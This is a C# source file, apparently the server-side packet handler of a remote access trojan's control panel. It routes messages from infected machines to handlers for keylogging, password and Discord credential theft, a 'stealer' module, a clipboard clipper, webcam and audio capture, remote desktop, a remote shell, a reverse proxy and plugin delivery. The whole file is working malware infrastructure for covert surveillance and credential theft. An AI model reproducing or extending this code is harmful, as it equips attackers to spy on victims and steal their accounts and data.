using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Forms;

namespace Server.Handle_Packet;

public class Packet
{
	public Clients client;

	public byte[] data;

	private HandleReverseProxy ReverseProxyHandler => Program.ReverseProxyHandler;

	public void Read(object o)
	{
		try
		{
			MsgPack unpack_msgpack = new MsgPack();
			unpack_msgpack.DecodeFromBytes(data);
			Program.mainform.Invoke((MethodInvoker)delegate
			{
				switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
				{
				case "dosAdd":
					break;
				case "ClientInfo":
					ThreadPool.QueueUserWorkItem(delegate
					{
						new HandleListView().HandleMsgPack(client, unpack_msgpack);
					});
					break;
				case "init_reg":
					new HandleLogs().Addmsg("Initiated All Dll Plugins on " + client.Ip + ".", Color.Red);
					break;
				case "Ping":
					new HandlePing().Ping(client, unpack_msgpack);
					client.LastPing = DateTime.Now;
					break;
				case "HvncPing":
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
					ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
					break;
				}
				case "Po_ng":
					new HandlePing().Po_ng(client, unpack_msgpack);
					client.LastPing = DateTime.Now;
					break;
				case "offlinelog":
				{
					string asString4 = unpack_msgpack.ForcePathObject("log").GetAsString();
					string text = Path.Combine(Application.StartupPath, "ClientsFolder", client.Ip, DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss") + " offline_keylog.log");
					File.WriteAllText(text, asString4);
					Process.Start(text);
					new HandleLogs().Addmsg("Offline key log on " + client.Ip + " is saved to " + text + ".", Color.Black);
					break;
				}
				case "Logs":
					new HandleLogs().Addmsg("From " + client.Ip + " client: " + unpack_msgpack.ForcePathObject("Message").AsString, Color.Black);
					break;
				case "thumbnails":
					client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
					new HandleThumbnails(client, unpack_msgpack);
					break;
				case "Received":
					new HandleListView().Received(client);
					client.LastPing = DateTime.Now;
					break;
				case "Error":
				{
					string asString7 = unpack_msgpack.ForcePathObject("Error").AsString;
					File.AppendAllText("error.log", asString7);
					break;
				}
				case "remoteDesktop":
					new HandleRemoteDesktop().Capture(client, unpack_msgpack);
					break;
				case "processManager":
					new HandleProcessManager().GetProcess(client, unpack_msgpack);
					break;
				case "netstat":
					new HandleNetstat().GetProcess(client, unpack_msgpack);
					break;
				case "socketDownload":
					new HandleFileManager().SocketDownload(client, unpack_msgpack);
					break;
				case "keyLogger":
					new HandleKeylogger(client, unpack_msgpack);
					break;
				case "fileManager":
					new HandleFileManager().FileManager(client, unpack_msgpack);
					break;
				case "shell":
					new HandleShell(unpack_msgpack, client);
					break;
				case "reportWindow":
					new HandleReportWindow(client, unpack_msgpack.ForcePathObject("Report").AsString);
					break;
				case "reportWindow-":
				{
					if (Settings.ReportWindow)
					{
						lock (Settings.LockReportWindowClients)
						{
							Settings.ReportWindowClients.Add(client);
							break;
						}
					}
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "reportWindow";
					msgPack2.ForcePathObject("Option").AsString = "stop";
					ThreadPool.QueueUserWorkItem(client.Send, msgPack2.Encode2Bytes());
					break;
				}
				case "webcam":
					new HandleWebcam(unpack_msgpack, client);
					break;
				case "sendPlugin":
					ThreadPool.QueueUserWorkItem(delegate
					{
						client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
					});
					break;
				case "fileSearcher":
					new HandleFileSearcher().SaveZipFile(client, unpack_msgpack);
					break;
				case "Information":
					new HandleInformation().AddToInformationList(client, unpack_msgpack);
					break;
				case "Password":
					new HandlePassword().SavePassword(client, unpack_msgpack);
					break;
				case "Audio":
					new HandleAudio().SaveAudio(client, unpack_msgpack);
					break;
				case "recoveryPassword":
					new HandleRecovery(client, unpack_msgpack);
					break;
				case "discordRecovery":
					new HandleDiscordRecovery(client, unpack_msgpack);
					break;
				case "regManager":
					new HandleRegManager().RegManager(client, unpack_msgpack);
					break;
				case "fun":
					new HandleFun().Fun(client, unpack_msgpack);
					break;
				case "stealer":
					new HandleStealer().SaveData(client, unpack_msgpack);
					break;
				case "clipper":
					_ = unpack_msgpack.ForcePathObject("Hwid").AsString;
					new HandleLogs().Addmsg("Clipper is started on " + client.Ip + "!", Color.Red);
					break;
				case "ReverseProxy":
					ReverseProxyHandler.Execute(client, unpack_msgpack);
					break;
				case "runningapp":
				{
					string asString5 = unpack_msgpack.ForcePathObject("hwid").AsString;
					string asString6 = unpack_msgpack.ForcePathObject("value").AsString;
					((FormTimerKeylog)Application.OpenForms[asString5 + ":TimerKeylog"])?.LoadRunningApp(asString6);
					break;
				}
				case "filterinfo":
				{
					string asString = unpack_msgpack.ForcePathObject("hwid").AsString;
					string asString2 = unpack_msgpack.ForcePathObject("running").AsString;
					string asString3 = unpack_msgpack.ForcePathObject("apps").AsString;
					((FormTimerKeylog)Application.OpenForms[asString + ":TimerKeylog"])?.LoadInfos(asString3, asString2);
					break;
				}
				}
			});
		}
		catch
		{
		}
	}
}
